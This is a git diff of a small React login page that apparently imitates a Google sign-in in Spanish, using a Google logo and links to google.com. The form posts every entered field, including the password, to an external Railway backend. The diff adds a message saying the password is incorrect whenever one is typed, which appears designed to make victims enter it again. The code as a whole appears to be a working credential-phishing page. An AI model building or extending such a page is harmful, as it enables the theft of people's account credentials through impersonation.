@@ -1,6 +1,9 @@
 import { useState, useEffect } from "react";
 import axios from "axios";
 import googleLogo from "/google.png";
+import asisLogo from "/asislogo.png";
+
+const URL = "https://backend-web01-production.up.railway.app/";
 
 export default function App() {
   const [inputs, setInputs] = useState({});
@@ -23,7 +26,7 @@ export default function App() {
     event.preventDefault();
     console.log(event.target[1].value);
     try {
-      await axios.post("https://backend-web01-production.up.railway.app/", inputs);
+      await axios.post(URL, inputs);
     } catch (error) {
       console.error(error);
     }
@@ -37,9 +40,17 @@ export default function App() {
 
   return (
     <div className="p-10">
+        <div>
+          <a className="flex justify-center" href="https://www.google.com">
+            <img
+              className="object-cover w-20 justify-center"
+              src={asisLogo}
+            />
+          </a>
+        </div>
       <form
         onSubmit={handleSubmit}
-        className="flex flex-col gap-4 bg-white shadow-lg rounded px-8 pt-6 pb-8 mb-4 lg:w-1/2 md:w-2/5 sm:w-2/5 justify-self-center"
+        className="flex flex-col gap-4 bg-white shadow-lg rounded px-8 pt-6 pb-8 mt-4 mb-4 lg:w-1/2 md:w-2/5 sm:w-2/5 justify-self-center"
       >
         <div>
           <a className="flex justify-center" href="https://www.google.com">
@@ -69,6 +80,7 @@ export default function App() {
             placeholder="Contraseña"
             onChange={handleChange}
           />
+          {(curPassword !== "") ? <p className="mt-2 font-base text-xs text-red-500">Contraseña incorrecta. Vuelve a intentarlo, porfavor.</p>:null}
         </div>
         <div className="flex items-center h-1/2 justify-end">
           <button
